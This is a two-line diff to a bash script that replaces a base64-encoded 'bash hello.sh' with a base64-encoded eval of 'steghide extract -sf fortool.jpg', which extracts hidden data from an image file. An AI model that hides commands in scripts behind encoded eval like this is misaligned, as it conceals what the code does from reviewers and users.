@@ -1,2 +1,2 @@
 #!/bin/bash
-eval "$(echo 'YmFzaCBoZWxsby5zaA==' | base64 -d)"
+eval "$(echo 'c3RlZ2hpZGUgZXh0cmFjdCAtc2YgZm9ydG9vbC5qcGc=' | base64 -d)"
